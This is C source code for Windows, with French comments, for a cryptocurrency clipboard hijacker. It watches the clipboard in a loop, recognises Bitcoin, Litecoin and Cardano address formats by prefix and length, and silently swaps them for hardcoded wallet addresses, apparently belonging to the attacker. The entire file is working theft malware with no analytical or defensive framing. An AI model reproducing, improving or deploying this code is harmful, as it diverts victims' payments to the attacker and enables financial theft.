#include <stdio.h>
#include <windows.h>

#include "clipboard.h"
#include "utils.h"
// #include "test.h"

StateCodeProcess main(void)
{
    // Définition des états de la machine à états
    typedef enum {
        STATE_ANALYZE_CLIPBOARD,
        STATE_MODIFY_CLIPBOARD,
        STATE_CLEAN_CLIPBOARD,
    } StateCodeFunction;

    // Définition des cryptomonnaies à surveiller
    typedef enum {
        BITCOIN,
        LITECOIN,
        CARDANO,
    } Cryptocurrency;

    // Définition de la taille du buffer pour stocker le texte du presse-papiers
    size_t buffer_size = 256;
    wchar_t buffer[buffer_size];

    // Définition des adresses de cryptomonnaies
    const wchar_t *bitcoin_address = L"bc1qz6nadfl5t8ul977walgphmslclez599t680gxl";
    const wchar_t *litecoin_address = L"LVeu6wYARDbNerc8Y1VTfLj9xY6zPiDdyt";
    const wchar_t *cardano_address = L"addr1q89vex35tegzhwnjx473uwj9z5hfrmxrqeq45faqj4d2x0x2ejdrghjs9wa8ydtarcay29fwj8kvxpjptgn6p9265v7qj9l407";

    // Définition des variables pour la machine à états
    Cryptocurrency cryptocurrency;
    StateCodeFunction state = STATE_ANALYZE_CLIPBOARD;

    // Machine à états principale pour surveiller et modifier le presse-papiers
    while (true) {
        switch (state) {
            case STATE_ANALYZE_CLIPBOARD:

                if (getClipboardText(buffer, buffer_size) == STATE_ERROR) {
                    printf("[ERROR] -- Failed to get clipboard text.\n");
                    return STATE_ERROR;
                }

                if (getClipboardText(buffer, buffer_size) == STATE_WARNING) {
                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                }

                int text_size = wcslen(buffer);

                // Vérification adresse déjà enregistrée
                if (wcscmp(buffer, bitcoin_address) == 0 || wcscmp(buffer, litecoin_address) == 0 || wcscmp(buffer, cardano_address) == 0) {
                    Sleep(500);
                    state = STATE_CLEAN_CLIPBOARD;
                    break;
                }

                // -------------------------------------------------- Vérification Bitcoin
                // Vérification adresse P2PKH et P2SH
                if (buffer[0] == L'1' || buffer[0] == L'3') {
                    if (text_size >= 26 && text_size <= 35) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // // Vérification adresse Bech32
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                    if (text_size == 42 || text_size == 62) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // // Vérification adresse Bech32m
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                    if (text_size == 62) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // -------------------------------------------------- Vérification Litecoin
                // Vérification adresse Legacy et Bech32
                if (buffer[0] == L'L' || buffer[0] == L'M' || (buffer[0] == L'l' && buffer[1] == L't' && buffer[2] == L'c' && buffer[3] == L'1')) {
                    if (text_size >= 26 && text_size <= 35) {
                        cryptocurrency = LITECOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // -------------------------------------------------- Vérification Cardano
                // Vérification adresse Shelley
                if (buffer[0] == L'a' && buffer[1] == L'd' && buffer[2] == L'd' && buffer[3] == L'r' && buffer[4] == L'1') {
                    if (text_size >= 58 && text_size <= 110) {
                        cryptocurrency = CARDANO;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                Sleep(500);
                break;

            case STATE_MODIFY_CLIPBOARD:

                wchar_t *crypto_address;
                if (cryptocurrency == BITCOIN) {
                    crypto_address = bitcoin_address;
                } else if (cryptocurrency == LITECOIN) {
                    crypto_address = litecoin_address;
                } else if (cryptocurrency == CARDANO) {
                    crypto_address = cardano_address;
                } else {
                    printf("[ERROR] -- Unknown cryptocurrency.\n");
                    return STATE_ERROR;
                }

                size_t size_crypto_address = getStringSize(crypto_address);

                if (setClipboardText(crypto_address, size_crypto_address) == STATE_ERROR) {
                    printf("[ERROR] -- Failed to set clipboard text.\n");
                    return STATE_ERROR;
                }

                if (setClipboardText(crypto_address, size_crypto_address) == STATE_WARNING) {
                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                }

                Sleep(500);
                state = STATE_ANALYZE_CLIPBOARD;

                break;

            case STATE_CLEAN_CLIPBOARD:
                EmptyClipboard();
                Sleep(500);
                state = STATE_ANALYZE_CLIPBOARD;

                break;
        }
    }

    return STATE_OK;
}